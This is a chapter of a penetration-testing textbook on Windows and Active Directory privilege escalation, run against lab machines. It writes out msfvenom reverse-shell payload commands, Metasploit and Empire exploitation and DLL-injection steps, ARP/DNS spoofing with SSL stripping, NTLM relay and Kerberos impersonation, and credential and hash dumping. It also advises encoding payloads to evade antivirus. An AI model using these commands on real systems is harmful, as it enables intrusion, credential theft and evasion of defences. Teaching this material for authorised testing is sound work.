<html><head></head><body>
  <div id="_idContainer506" class="Basic-Text-Frame">
    <h1 class="chapterNumber">12</h1>
    <h1 id="_idParaDest-283" class="chapterTitle">Privilege Escalations</h1>
    <p class="normal">Privilege escalation is the process of going from a relatively low level of access rights to gaining the privileges of an administrator, the system, or even greater access privileges. It allows the penetration tester to own all aspects of a system’s operations. More importantly, obtaining some access privileges will allow testers to control all systems across a network. As vulnerabilities become more difficult to find and exploit, a significant amount of research has been conducted into privilege escalation as a means of ensuring a successful penetration test.</p>
    <p class="normal">In this chapter, we will look at the following topics:</p>
    <ul>
      <li class="bulletList">Common escalation methodology</li>
      <li class="bulletList">Local system escalation</li>
      <li class="bulletList">DLL injection</li>
      <li class="bulletList">Credential harvesting through sniffing and escalation</li>
      <li class="bulletList">Golden ticket attack on Kerberos</li>
      <li class="bulletList">Active Directory access rights</li>
    </ul>
    <h1 id="_idParaDest-284" class="heading-1">Overview of the common escalation methodology</h1>
    <p class="normal">Everything that starts with a methodology<a id="_idIndexMarker1288"/> offers an approach to a problem solution. In this section, we will go through the common escalation methodology utilized by attackers during a red teaming exercise, or penetration testing. </p>
    <p class="normal"><em class="italic">Figure 12.1</em> depicts the methodology that can be used:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_01.png" alt="Diagram  Description automatically generated with low confidence"/></figure>
    <p class="packt_figref">Figure 12.1: A typical user privilege hierarchy</p>
    <p class="normal">In line with the cyber kill chain methodology, the actions taken to achieve the objective include escalation of privilege to maintain persistence to the target environment.</p>
    <p class="normal">The following are the types of user accounts that are found in any target system:</p>
    <ul>
      <li class="bulletList"><strong class="keyWord">Normal user</strong>: Typical access<a id="_idIndexMarker1289"/> through a backdoor run at the level of the user who executes the backdoor. These are the normal users of the system (Windows or Unix) and are either local users or domain users with limited system access to perform only tasks that are allowed for them.</li>
      <li class="bulletList"><strong class="keyWord">Local administrator</strong>: Local administrators<a id="_idIndexMarker1290"/> are system account holders who have the privilege to run system configuration changes.</li>
      <li class="bulletList"><strong class="keyWord">Delegated administrator</strong>: Delegated administrators are local user<a id="_idIndexMarker1291"/> accounts with administrator privileges. Example account operators or backup operators are typical groups used in Active Directory environments to delegate administrative tasks.</li>
      <li class="bulletList"><strong class="keyWord">Domain administrator</strong>: Domain administrators are users who can administer the domains<a id="_idIndexMarker1292"/> that they are a member of.</li>
      <li class="bulletList"><strong class="keyWord">Enterprise administrator</strong>: Enterprise administrators are accounts that have the most privileges<a id="_idIndexMarker1293"/> for maintaining the entire forest in an Active Directory.</li>
      <li class="bulletList"><strong class="keyWord">Schema administrator</strong>: Schema administrators<a id="_idIndexMarker1294"/> are users who can configure the schema of the forest. The reason schema admins are not included as the most privileged account is because attackers cannot add users to any other groups: that would limit the access level to modifying the Active Directory forest.</li>
    </ul>
    <h1 id="_idParaDest-285" class="heading-1">Escalating from domain user to system administrator</h1>
    <p class="normal">In most cases, attackers performing<a id="_idIndexMarker1295"/> console-level attacks or social engineering attacks might gain access to a normal domain user who is not a local administrator, which leaves them with access only to a limited level of privileges. This can be bypassed and exploited to gain system-level access on the victim machine without having to be a local admin. We will utilize Windows 2008 Metasploitable3 to perform the local privilege escalation. Following are the steps involved in performing the attack:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Create an executable with a payload using <code class="inlineCode">msfvenom</code> by running <code class="inlineCode">sudo msfvenom –p windows/meterpreter/reverse_tcp LHOST=&lt;Kali IP&gt; LPORT=&lt;Port No&gt; -f exe –o Output.exe.</code> from the Kali terminal. </li>
      <li class="numberedList">Log in to Metasploitable3 using the <code class="inlineCode">normaluser</code> user account with the password that we created in <em class="chapterRef">Chapter 1, </em><em class="italic">Goal-Based Penetration Testing</em>. Upload the file to the target either through file share or by simply running the simple HTTP server using Python (<code class="inlineCode">python3 -m http.server &lt;custom port number&gt;</code>). </li>
      <li class="numberedList">Once the file is in the target, execution of the file as a normal user should provide the reverse shell on Kali Linux. Ensure you start the Metasploit listener prior to the execution of the payload. </li>
      <li class="numberedList">When attackers initially gain access to the system using the normal user and try to run system-level commands, you will receive the response <code class="inlineCode">access denied</code> or <code class="inlineCode">no privilege available to run the commands on the target system</code>. </li>
      <li class="numberedList">This can be verified by running the <code class="inlineCode">getsystem</code> command from the Meterpreter console, as shown in <em class="italic">Figure 12.2</em>:<figure class="mediaobject"><img src="../Images/B17765_12_02.png" alt=""/></figure>
        <p class="packt_figref">Figure 12.2: Meterpreter shell running getsystem </p>
      </li>
      <li class="numberedList">We will explore this local<a id="_idIndexMarker1296"/> vulnerability that exists in older versions of Windows such as Windows 2008/7. We will use the latest local exploit, <code class="inlineCode">ms18_8120_win32k_privesc</code>, exploiting the Win32k component, which doesn’t handle the object’s property in memory. You can move the existing Meterpreter session to the background to utilize post-exploit modules via the following steps:
        <pre class="programlisting con"><code class="hljs-con">meterpreter &gt; background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) &gt; use exploit/windows/local/ms18_8120_win32k_privesc 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms18_8120_win32k_privesc) &gt; set session 1
session =&gt; 1
msf6 exploit(windows/local/ms18_8120_win32k_privesc) &gt; exploit
</code></pre>
      </li>
      <li class="numberedList">Successful exploitation of the vulnerability should open up another shell with a high privilege level, as shown in <em class="italic">Figure 12.3</em>:<figure class="mediaobject"><img src="../Images/B17765_12_03.png" alt=""/></figure>
        <p class="packt_figref">Figure 12.3: Exploiting local Windows privilege escalation vulnerability on Metasploitable3</p>
      </li>
      <li class="numberedList">Now the new session must provide you with access to the system level as NT AUTHORITY\SYSTEM, which will enable attackers to create a local administrator-level user, as shown in <em class="italic">Figure 12.4</em>, and move laterally by extracting hash<a id="_idIndexMarker1297"/> dumps using the <code class="inlineCode">hashdump</code> command from the Meterpreter shell or enable RDP and log in with the new admin account:<figure class="mediaobject"><img src="../Images/B17765_12_04.png" alt=""/></figure>
        <p class="packt_figref">Figure 12.4: Successful access to Metasploitable3 with admin privileges</p>
      </li>
    </ol>
    <h1 id="_idParaDest-286" class="heading-1">Local system escalation</h1>
    <p class="normal">In Windows 10, we can utilize a different technique to bypass the existing privilege. One of the drawbacks<a id="_idIndexMarker1298"/> of this attack is, in order to get system-level access, the affected local user must be part of the local administrators group. </p>
    <p class="normal">Attackers will be able to run the Meterpreter shell only in the context of the user. To bypass this restriction, we can leverage multiple post-exploit modules. We will be sending the <code class="inlineCode">background</code> command to our Meterpreter shell to run the post exploit module. In this example, we will utilize the <code class="inlineCode">bypassuac_fodhelper</code> post-exploit module, as shown in <em class="italic">Figure 12.5</em>:</p>
    <pre class="programlisting con"><code class="hljs-con">meterpreter &gt; background
[*] Backgrounding session 1...
msf exploit(multi/handler) &gt; use exploit/windows/local/bypassuac_fodhelper
msf exploit(multi/handler) &gt; set session 1
msf exploit(multi/handler) &gt; exploit
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_12_05.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.5: Exploiting Windows 10 local privilege escalation</p>
    <p class="normal">The <code class="inlineCode">bypassuac_fodhelper</code> module in the Meterpreter shell will utilize the existing session to provide a more privileged Meterpreter shell, as shown in <em class="italic">Figure 12.6</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_06.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.6: Successful access to Windows 10 with SYSTEM privileges</p>
    <p class="normal">We have successfully run<a id="_idIndexMarker1299"/> the local exploit to gain the SYSTEM level privileges from a low-privileged user. In the next section, we will exploit the user with local administrative privileges to escalate them to a SYSTEM level user. </p>
    <h1 id="_idParaDest-287" class="heading-1">Escalating from administrator to system</h1>
    <p class="normal">Administrator privileges<a id="_idIndexMarker1300"/> allow an attacker to create and manage accounts and access most data available on a system. However, some complex functionality mandates that the requester have system-level access privileges. There are several ways to continue this escalation to the system level. The easiest way is to run <code class="inlineCode">PsExec</code> to get system-level access by uploading <code class="inlineCode">PsExec</code> to the desired folder and run the following command as a local administrator:</p>
    <pre class="programlisting con"><code class="hljs-con">PsExec -s -i -d cmd.exe
</code></pre>
    <p class="normal">This command should open up another Command Prompt as the system user, as shown in <em class="italic">Figure 12.7</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_07.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.7: Escalating from local administrator to SYSTEM using Psexec</p>
    <h2 id="_idParaDest-288" class="heading-2">DLL injection</h2>
    <p class="normal"><strong class="keyWord">DLL</strong> (<strong class="keyWord">Dynamic Link Library</strong>) injection is another easy technique that is utilized by attackers to run remote<a id="_idIndexMarker1301"/> code in the context of the address space of another process. This process must be running with excess privileges that can then be used to escalate privilege in the form of a DLL file.</p>
    <p class="normal">Metasploit has a specific module you can use to perform DLL injection. The only thing the attacker needs to do is link the existing Meterpreter session and specify the <code class="inlineCode">PID</code> of the process and the path of the DLL. We will explore another way and utilize the PowerShell DLL injection module from the Empire tool. You can create a DLL with the payload via <code class="inlineCode">msfvenom</code>:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=&lt;Kali IP&gt; lport=443 -f dll -o /home/kali/injectmex64.dll
</code></pre>
    <p class="normal">Once we have the backdoor DLL file created, we can utilize the existing Meterpreter session to run PowerShell. Attackers can create a PowerShell payload by running the following commands in the terminal:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo powershell-empire server 
sudo powershell-empire client (in a new tab)
uselistener http
set Host &lt;Your IP&gt;
set Port &lt;port number&gt;
execute
usestager multi/launcher
set Listener http
execute
</code></pre>
    <p class="normal">That should provide<a id="_idIndexMarker1302"/> us with the PowerShell payload that we can execute on the target. In this case, we will utilize Windows 10 as an example and run the PowerShell script directly from the Meterpreter shell, as seen in <em class="italic">Figure 12.8</em>: </p>
    <figure class="mediaobject"><img src="../Images/B17765_12_08.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.8: Executing Empire agent payload from Meterpreter</p>
    <p class="normal">Successful execution of PowerShell should report an agent to the Empire console. Attackers can validate that by running the <code class="inlineCode">agents</code> command and actively executing commands on the agent type <code class="inlineCode">interact</code> with the agent name within Empire, as shown in <em class="italic">Figure 12.9</em>: </p>
    <figure class="mediaobject"><img src="../Images/B17765_12_09.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.9: Successful agent reporting to the Empire client console</p>
    <p class="normal">Testers can now upload the DLL file that we created to the target system; this will upload to the folder from where the PowerShell script was executed:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_10.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.10: Uploading the malicious DLL to the target</p>
    <p class="normal">Running the <code class="inlineCode">ps</code> command<a id="_idIndexMarker1303"/> in the PowerShell Empire terminal should provide us with the list of current processes running on the target. Select the right process, which is running as <code class="inlineCode">NT AUTHORITY/SYSTEM</code>, and execute the following commands in the PowerShell Empire terminal:</p>
    <pre class="programlisting con"><code class="hljs-con">(Empire: 2A54TX1L) &gt; ps
(Empire: 2A54TX1L) &gt; upload /root/chap12/injectme.dll
(Empire: 2A54TX1L) &gt; usemodule code_execution/invoke_dllinjection
(Empire: powershell/code_execution/invoke_dllinjection) &gt; set ProcessID 4060
(Empire: powershell/code_execution/invoke_dllinjection) &gt; set Dll C:\&lt;location&gt;\injectmex64.dll
(Empire: powershell/code_execution/invoke_dllinjection) &gt; execute
</code></pre>
    <div class="note">
      <p class="normal">If the testers cannot see the system process owner when running the <code class="inlineCode">ps</code> command, then run the Empire PowerShell payload as local administrator. </p>
      <p class="normal">The majority of antivirus/anti-malware/EDR will detect this method easily; however, it is advised that the payload of the DLL is encoded with multiple iterations.</p>
    </div>
    <p class="normal">Once the DLL file is injected<a id="_idIndexMarker1304"/> into a running process, attackers should be able to see an agent reporting back as a privileged user, as shown in <em class="italic">Figure 12.11</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_11.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.11: Successful upload of the malicious DLL to the target</p>
    <p class="normal">Once you have successfully invoked the DLL, the payload must be executed and must have opened up a reverse shell as the system-level user, as shown in <em class="italic">Figure 12.12</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_12.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.12: Reverse shell on Meterpreter through successful DLL injection using PowerShell Empire</p>
    <p class="normal">We have successfully performed the DLL<a id="_idIndexMarker1305"/> injection to gain a highly privileged SYSTEM account. In the next section, we will explore a different approach to harvest credentials and escalate privileges. </p>
    <h1 id="_idParaDest-289" class="heading-1">Credential harvesting and escalation attacks</h1>
    <p class="normal">Credential harvesting<a id="_idIndexMarker1306"/> is the process of identifying usernames, passwords, and hashes that can be utilized to achieve the objective set by the organization<a id="_idIndexMarker1307"/> for a penetration testing/red team exercise. In this section, we will walk through three different types of credential harvesting mechanisms that are typically used by attackers in Kali Linux.</p>
    <h2 id="_idParaDest-290" class="heading-2">Password sniffers</h2>
    <p class="normal">Password sniffers are a set of tools/scripts that typically perform man-in-the-middle attacks by discovery, spoofing, sniffing traffic, and by proxying. From our previous experience, we<a id="_idIndexMarker1308"/> noted that most organizations do not utilize SSL internally; Wireshark revealed multiple usernames and passwords.</p>
    <p class="normal">In this section, we will explore <code class="inlineCode">bettercap</code> to capture SSL traffic on the network so that we can capture the credentials of network users. <code class="inlineCode">bettercap</code> is similar to the previous-generation <code class="inlineCode">ettercap</code> command, with the additional capability to perform network-level spoofing and sniffing. It can be downloaded to Kali Linux by running <code class="inlineCode">sudo apt install bettercap</code> from the terminal. <code class="inlineCode">bettercap</code> underwent a lot of development between 2018 and 2020 to make it compatible with the user interface and enabled caplet use. Caplets are just <code class="inlineCode">.cap</code> files that can be scripted to achieve an objective for interactive sessions; this can be installed or updated by running a simple command on the terminal: <code class="inlineCode">sudo apt install bettercap-caplets</code>. </p>
    <p class="normal">This tool can be utilized for a more effective man-in-the-middle attack on a given internal network. In this example, we will utilize one caplet with the following script to capture passwords with an ARP and DNS spoof within the <code class="inlineCode">bettercap</code> shell:</p>
    <pre class="programlisting con"><code class="hljs-con">net.sniff on
" set http.proxy.sslstrip true
" http.proxy on
" set dns.spoof.domains www.office.com,login.microsoftonline.com,testfire.net
" set dns.spoof.all true
" dns.spoof on
" arp.spoof on
</code></pre>
    <p class="normal"><code class="inlineCode">bettercap</code> must be able to sniff all the traffic on the target network without any problems, as <em class="italic">Figure 12.13</em> showcases:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_13.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.13: Capturing plaintext passwords on HTTP protocol using bettercap</p>
    <p class="normal">To strip SSL<a id="_idIndexMarker1309"/> traffic, we can utilize the <code class="inlineCode">https.proxy</code> module, as follows:</p>
    <pre class="programlisting con"><code class="hljs-con">" net.sniff on
" set https.proxy.sslstrip true
" https.proxy on
" arp.spoof on
" hstshijack/hstshijack
</code></pre>
    <p class="normal">The <code class="inlineCode">hstshijack</code> caplet will enable attackers to view the requests when a web server redirects the HTTP traffic to HTTPS and attackers can leverage the redirects to force the web server to respond on HTTP. The preceding commands in <code class="inlineCode">bettercap</code> must enable attackers to see HTTPS traffic, as shown in <em class="italic">Figure 12.14</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_14.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.14: Sniffing all the encrypted URLs using the sslstrip caplet in Bettercap</p>
    <p class="normal">Penetration testers<a id="_idIndexMarker1310"/> should be careful when using <code class="inlineCode">bettercap</code>, as this will pause the entire network your Kali Linux is connected to when <code class="inlineCode">arp spoof on</code> is run.</p>
    <h2 id="_idParaDest-291" class="heading-2">Responder</h2>
    <p class="normal">Responder is an in-built Kali Linux tool for <strong class="keyWord">Link-Local Multicast Name Resolution</strong> (<strong class="keyWord">LLMNR</strong>) and <strong class="keyWord">NetBIOS Name Service</strong> (<strong class="keyWord">NBT-NS</strong>) that responds to specific<a id="_idIndexMarker1311"/> NetBIOS queries based<a id="_idIndexMarker1312"/> on the file server request. This tool<a id="_idIndexMarker1313"/> can be launched by running <code class="inlineCode">responder -I eth0 (ethernet adapter name of your network that you want to) -h</code> in the terminal, as shown in <em class="italic">Figure 12.15</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_15.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.15: The Responder tool’s main menu</p>
    <p class="normal">Responder has the ability <a id="_idIndexMarker1314"/>to do the following:</p>
    <ul>
      <li class="bulletList">Check for a local host file that includes any specific DNS entries</li>
      <li class="bulletList">Automatically perform a <strong class="keyWord">DNS</strong> query <a id="_idIndexMarker1315"/>on the selected network</li>
      <li class="bulletList">Use <strong class="keyWord">LLMNR/NBT-NS</strong> to send<a id="_idIndexMarker1316"/> out broadcast messages<a id="_idIndexMarker1317"/> to the selected network</li>
    </ul>
    <p class="normal">Attackers on the same network can fire up Responder on the network by running <code class="inlineCode">sudo responder –I eth0 –wF –v</code> in the Kali terminal, as shown in <em class="italic">Figure 12.16</em>. Responder has the ability to set up multiple server types by itself:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_16.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.16: Running Responder on the local network to perform a MiTM attack</p>
    <p class="normal">In this example, let’s say we venom the entire network<a id="_idIndexMarker1318"/> if a device tries to access the fileserver <code class="inlineCode">\\&lt;FILESERVER&gt;\\</code>. This will then redirect to the responder-hosted SMB server to capture the NTLM username and hash.</p>
    <p class="normal">If the victims try and access the Kali Linux IP or the hostname that is poised and redirected to the responder, the victims will have the popup shown in <em class="italic">Figure 12.7</em> and Responder will capture the username and NTLM hash of the value that is submitted: </p>
    <figure class="mediaobject"><img src="../Images/B17765_12_17.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.17: Popup created by Responder to capture the NTLM username and password hash</p>
    <p class="normal">During a red team<a id="_idIndexMarker1319"/> activity, we noted that security teams who successfully identified the rogue device went on entering the domain administrator credentials to access the rogue device over SMB. Now the attackers use Responder to pause the results, including the NTLM username and the hash, as shown in <em class="italic">Figure 12.18</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_18.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.18: Responder poisoning the network and capturing the username and NTLMv2 hashes</p>
    <p class="normal">All the log files will be <a id="_idIndexMarker1320"/>available in <code class="inlineCode">/usr/share/responder/logs/</code>, and the log filename will be <code class="inlineCode">SMB-NTLMv2-SSP-&lt;IP&gt;.txt</code>. This can then be passed directly to John the Ripper or <code class="inlineCode">hashcat</code> by running <code class="inlineCode">john SMBv2-NTLMv2-SSP-&lt;IP&gt;.txt</code> for the offline cracking of the NTLM hash that was captured or <code class="inlineCode">hashcat –m 5600 SMB-NTLVMv2-SSP-&lt;IP&gt;.txt &lt;wordlist&gt;.</code> If the dictionary did include the password, then it would be cracked, as <em class="italic">Figure 12.19</em> shows for <code class="inlineCode">hashcat</code>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_19.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.19: Successfully cracking the NTLMv2 SMB password for the user</p>
    <h2 id="_idParaDest-292" class="heading-2">Performing a MiTM attack on LDAP over TLS</h2>
    <p class="normal">In this section, we will explore how to gain local admin credentials of a given endpoint using a stealthy method. Microsoft Kerberos<a id="_idIndexMarker1321"/> has a delegation feature that allows any application to reuse the user credentials to access resources hosted on different servers. This Kerberos delegation can be exploited when it’s a fresh installation of Windows servers with default configurations. This technique works if the network<a id="_idIndexMarker1322"/> has LLMNR, NBT-NS that enforces LDAP<a id="_idIndexMarker1323"/> signing, and channel binding of the <strong class="keyWord">LDAP</strong> (<strong class="keyWord">Lightweight Directory Access Protocol</strong>) over <strong class="keyWord">TLS</strong> (<strong class="keyWord">Transport Layer Security</strong>).</p>
    <p class="normal">In this scenario, pentesters have access to the internal network and find a Windows 10 device that is connected to the same network. As a first step, testers can identify the hostname or domain name by just running <code class="inlineCode">crackmapexec</code> on the IP range. This would actually be noisy and might alert the administrators about you trying to authenticate to all the systems on the network anonymously. </p>
    <p class="normal">Once the domain name and the target device are identified, we add the internal DNS IP to our Kali Linux by adding the <code class="inlineCode">nameserver IP</code> to <code class="inlineCode">/etc/resolv.conf</code> to ensure we can reach the local hostnames within the target network. Windows versions from Vista and above have IPv6 enabled by default, and when devices boot up, they will start looking for configurations for DHCP and WPAD.</p>
    <p class="normal">We will utilize <code class="inlineCode">mitm6</code>. This tool<a id="_idIndexMarker1324"/> is not pre-installed in Kali Linux. To install the tool, run <code class="inlineCode">sudo pip3 install mitm6</code> and then run <code class="inlineCode">sudo mitm6 –hw &lt;Windows 10 machine name&gt; -d &lt;Domain name&gt; --ignore-nofqdn</code>, which should whitelist the IPv6 DNS and be ready to provide the IPv6 address of the Kali Linux as part of the default gateway:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_20.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.20: Performing a MiTM attack using mitm6</p>
    <p class="normal">Once <code class="inlineCode">mitm6</code> is up and running, the victim devices on the network should now be using the default gateway without Kali Linux IPv6 IP addresses on all the available targets, as seen in <em class="italic">Figure 12.21</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_21.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.21: Target machine with the new IPv6 address added to the gateway</p>
    <p class="normal">However, to perform the next step, a reboot of the victim device is advised. To capture the credentials, we will utilize<a id="_idIndexMarker1325"/> Impacket, which is a collection of open-source modules written in Python mainly utilized to manipulate network protocols. It is installed by default in Kali Linux. Particularly to perform this attack, we will use <code class="inlineCode">impacket-ntlmrelayx</code> to host LDAPS and WPAD services on the target by running the following command in the terminal, as seen in <em class="italic">Figure 12.22</em>:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo impact-ntlmrelayx –t ldaps://domaincontrollerIP –delegate-access –no-smb-server –wh attacker-wpad  
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_12_22.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.22: Running impacket-ntlmrelay targeting LDAP and WPAD services</p>
    <p class="normal">When <code class="inlineCode">ntlmrelayx</code> captures the credentials successfully, you should see the confirmation within the same window, as seen in <em class="italic">Figure 12.23</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_23.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.23: Successfully relaying the NTLM hash to the LDAP server</p>
    <p class="normal">Not only does <code class="inlineCode">ntlmrelayx</code> authenticate to the real LDAPS service, but it also has the ability to dump all the domain<a id="_idIndexMarker1326"/> details such as domain users, domain computers, and domain trusts saved within the same folder where the command was run from. </p>
    <p class="normal">Additionally, NTLMrelayx should create a new machine account by relaying the delegation, acting as a frontend application that is trying to reuse the user credentials, and it will modify <code class="inlineCode">msDS-AllowedToActOnBehalfOfOtherIdentity</code> on Windows 10 to allow the newly created machine to impersonate any user on that local machine. </p>
    <p class="normal">Attackers should be able to see the following confirmation: </p>
    <figure class="mediaobject"><img src="../Images/B17765_12_24.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.24: Successfully adding a computer to the domain</p>
    <p class="normal">By design, in Active Directory, users can create additional machine accounts. The next step is to request the service<a id="_idIndexMarker1327"/> ticket to access the Windows 10 impersonating domain admin privileges. For that, we will need to call a <strong class="keyWord">service principal name</strong> (<strong class="keyWord">SPN</strong>), which is a unique identifier<a id="_idIndexMarker1328"/> of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. Attackers can leverage the output that was created from <code class="inlineCode">lootdir</code> to get the SPNs that are available. We will now utilize the <code class="inlineCode">impacket-getST</code> Python script to impersonate the highly privileged administrator account to the domain controller. You should be prompted to enter the password and finally capture the service ticket and it will be saved in <code class="inlineCode">.ccache</code> format to the same folder where the command was run:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo impact-getST –spn SPNname/TargetMachinename Domainname/NewComputerCreatedbyNTLMrelayx –impersonate Administrator –dc-ip &lt;Domain controller IP &gt;
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_12_25.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.25: Creating a service ticket for a specific SPN impersonating a high-privilege user</p>
    <p class="normal">Using the service ticket, we need to export the <code class="inlineCode">KRB5CCNAME</code> ticket to an environment variable by running <code class="inlineCode">export KRB5CCNAME=/Home/kali/Administrator.ccache</code> in the Kali Linux terminal. The Impacket modules will utilize the values directly from the environment variables. Now we are ready to authenticate to the target machine with the service ticket that we generated from the domain controller and run as a high-privileged user. </p>
    <p class="normal">We run <code class="inlineCode">sudo impacket-wmiexec -k –no-pass –debug target-Machine-DNS-Name</code>. A successful exploitation will bring the following screen: </p>
    <figure class="mediaobject"><img src="../Images/B17765_12_26.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.26: Executing the WMIC on the target machine</p>
    <p class="normal">Additionally, the same should also provide us with a limited shell but running as the user who created the service<a id="_idIndexMarker1329"/> ticket. Attackers can leverage this shell to run the PowerShell Empire script to again complete an interactive session: </p>
    <figure class="mediaobject"><img src="../Images/B17765_12_27.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.27: Limited shell on the target machine as a high-privilege user</p>
    <p class="normal">We can also extract the local <a id="_idIndexMarker1330"/>hash on the target machine. This can be achieved by running <code class="inlineCode">sudo impacket-secretsdump –k –no-pass –debug &lt;Target Machine name&gt;</code>, which should provide us with the local hashes, as seen in <em class="italic">Figure 12.28</em>: </p>
    <figure class="mediaobject"><img src="../Images/B17765_12_28.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.28: Dumping all the local hashes from the target machine</p>
    <p class="normal">One other thing pentesters normally forget is to validate the machine hash. Most of the time, this should provide us with lots of information such as shared drives on the target device. This can be verified<a id="_idIndexMarker1331"/> by running <code class="inlineCode">crackmapexec smb</code> on the target IP with the hash value that we get from <code class="inlineCode">impacket-secretsdump</code>: </p>
    <figure class="mediaobject"><img src="../Images/B17765_12_29.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.29: Verifying the machine hash using crackmapexec</p>
    <h1 id="_idParaDest-293" class="heading-1">Escalating access rights in Active Directory</h1>
    <p class="normal">We have just explored how to escalate<a id="_idIndexMarker1332"/> privileges within a system and how to grab credentials<a id="_idIndexMarker1333"/> over the network. Now let’s utilize all the details that we have collected so far; then we should be able to achieve the goal of penetration testing using the cyber kill chain methodology. In this section, we will escalate the privilege of a normal domain user to that of the domain administrator.</p>
    <p class="normal">We identify the system that is connected to the domain and utilize our Empire PowerShell tool to escalate to the domain controller and dump all the username and password hashes:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_30.png" alt="A screenshot of a computer  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 12.30: Current reporting agents in PowerShell Empire</p>
    <p class="normal">You can harvest more information about the domain using the <code class="inlineCode">situational_awareness</code> module, <code class="inlineCode">get_domain_controller</code>:</p>
    <pre class="programlisting con"><code class="hljs-con">usemodule situational_awareness/network/powerview/get_domain_controller
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_12_31.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.31: Output of the domain controller details</p>
    <p class="normal">To identify who is logged<a id="_idIndexMarker1334"/> in to the domain, attackers can utilize<a id="_idIndexMarker1335"/> the <code class="inlineCode">get_loggedon</code> module, described as follows:</p>
    <pre class="programlisting con"><code class="hljs-con">usemodule situational_awareness/network/powerview/get_loggedOn
execute
</code></pre>
    <p class="normal">All users who logged in to the domain controllers will be visible, as shown in <em class="italic">Figure 12.32</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_32.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.32: Logon details on the domain controller</p>
    <p class="normal">Escalate the privilege<a id="_idIndexMarker1336"/> locally by using<a id="_idIndexMarker1337"/> the <code class="inlineCode">getsystem</code> module, as shown in <em class="italic">Figure 12.33</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_33.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.33: Empire module successfully getting SYSTEM privilege</p>
    <p class="normal">The next step of the escalation methodology is to escalate the privilege to that of the domain administrator. This will not be required once you have run <code class="inlineCode">mimikatz</code> to dump all the user passwords and hashes, as shown in the following screenshot. </p>
    <p class="normal">You can use<a id="_idIndexMarker1338"/> the hash or plaintext test password<a id="_idIndexMarker1339"/> to authenticate through the <code class="inlineCode">PsExec</code> module in Metasploit or CrackMapExec:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_34.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.34: PowerShell Empire output of Mimikatz</p>
    <p class="normal">Now attackers can check all the credentials<a id="_idIndexMarker1340"/> in the Empire tool’s credentials storage<a id="_idIndexMarker1341"/> by typing <code class="inlineCode">credentials</code> in the Empire interface, as shown in <em class="italic">Figure 12.35</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_35.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.35: Credentials that are stored within PowerShell Empire</p>
    <p class="normal">The fastest way to dump<a id="_idIndexMarker1342"/> all users in Active Directory<a id="_idIndexMarker1343"/> is to use <code class="inlineCode">crackmapexec smb</code> and pass the hash, as seen in <em class="italic">Figure 12.36</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_36.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.36: Extracting the NTDS using CrackMapExec</p>
    <p class="normal">If the attackers choose to do it manually, the next step<a id="_idIndexMarker1344"/> is to leverage CrackMapExec to validate<a id="_idIndexMarker1345"/> the hash against the domain controller and also run the PowerShell Empire agent payload, as seen in <em class="italic">Figure 12.37</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_37.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.37: Executing the PowerShell payload on the domain controller using crackmapexec</p>
